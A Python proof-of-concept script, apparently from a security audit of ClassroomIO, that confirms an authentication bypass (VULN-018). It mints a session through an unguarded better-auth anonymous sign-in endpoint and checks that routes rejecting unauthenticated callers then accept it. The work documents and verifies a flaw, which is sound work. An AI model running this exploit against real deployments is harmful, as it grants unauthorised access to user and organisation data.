#!/usr/bin/env python3
"""
VULN-018 (F-18) — Unauthenticated session via the better-auth `anonymous()` plugin.

Vulnerable code (targets/classroomio/):
  * plugin registration: packages/db/src/auth.ts:137   (`anonymous(),`)
  * signup guard scope:  apps/api/src/app.ts:114        (signupGuard wraps only /api/auth/sign-up/*)

Class: CWE-287 improper authentication / broken access control.

The flaw: the `anonymous()` better-auth plugin is registered but has NO frontend
caller (grep-confirmed). It exposes `POST /api/auth/sign-in/anonymous`, which is NOT
covered by `signupGuard` (that only wraps `/api/auth/sign-up/*`). So any client mints
a real `user` + session with no signup, email, org context, or invite — defeating the
self-hosted signup control. That session satisfies every `authMiddleware` /
`authOrApiKeyMiddleware` gate, which is what amplifies VULN-004 (credit mint),
VULN-033 (org-config read), VULN-010 (cohort self-grant), etc. to unauthenticated.

Exploitation idea: POST /api/auth/sign-in/anonymous, then use the returned session
cookie on routes that reject anonymous (no-cookie) callers.

A successful run proves: endpoints that return 401 with no cookie return 200 with the
minted anonymous session — i.e. an unauthenticated actor obtained an authorized session.
"""
import os
import sys
import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import log, banner, verdict, anon_session, API, BASE_URL  # noqa: E402

VULN = "VULN-018"
# Routes gated by authMiddleware / authOrApiKeyMiddleware: 401 without a session.
GATED = ["/account/profile", "/organization"]


def no_cookie_get(path):
    return requests.get(API + path, headers={"Origin": BASE_URL}, timeout=10)


def main():
    banner(VULN, "Unauthenticated session via anonymous() plugin")
    log("INFO", "plugin registered at packages/db/src/auth.ts:137; signupGuard (app.ts:114) wraps only sign-up/*")

    # Baseline: with no session cookie these routes must reject.
    baseline = {}
    for p in GATED:
        r = no_cookie_get(p)
        baseline[p] = r.status_code
        log("STEP", f"baseline (no cookie): GET {p} → HTTP {r.status_code}")
    if not all(v == 401 for v in baseline.values()):
        log("INFO", "note: not all baselines were 401; continuing")

    # Mint the unauthenticated session.
    log("SETUP", "POST /api/auth/sign-in/anonymous  (no account, no signup, no invite)")
    attacker = anon_session()
    isanon = (attacker.user or {}).get("isAnonymous")
    uid = (attacker.user or {}).get("id")
    log("SETUP", f"minted session: user={uid} isAnonymous={isanon} orgRoles={attacker.org_roles()}")

    here = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(here, "response.txt"), "w") as f:
        f.write("POST /api/auth/sign-in/anonymous  →  session user\n")
        f.write(str(attacker.session_info()) + "\n\n")

    # Now the same routes with the anon cookie.
    bypassed = []
    for p in GATED:
        r = attacker.get(p)
        log("STEP", f"with anon session: GET {p} → HTTP {r.status_code}")
        if baseline.get(p) == 401 and r.status_code == 200:
            bypassed.append(p)
            with open(os.path.join(here, "response.txt"), "a") as f:
                f.write(f"GET {p} (anon cookie) → {r.status_code}\n{str(r.text)[:400]}\n\n")

    if isanon and bypassed:
        log("PROOF", f"routes {bypassed} returned 401 with no cookie but 200 with the minted anonymous "
                     f"session → an unauthenticated actor obtained an authorized session (signupGuard bypassed)")
        verdict(VULN, "CONFIRMED", "anonymous() plugin yields a usable unauthenticated session")
        log("OK", "exploit confirmed — free authorized sessions with no signup/email/invite")
        sys.exit(0)

    verdict(VULN, "FAILED", f"isAnonymous={isanon} bypassed={bypassed}")
    log("FAIL", "anonymous session did not bypass an auth gate")
    sys.exit(1)


if __name__ == "__main__":
    main()
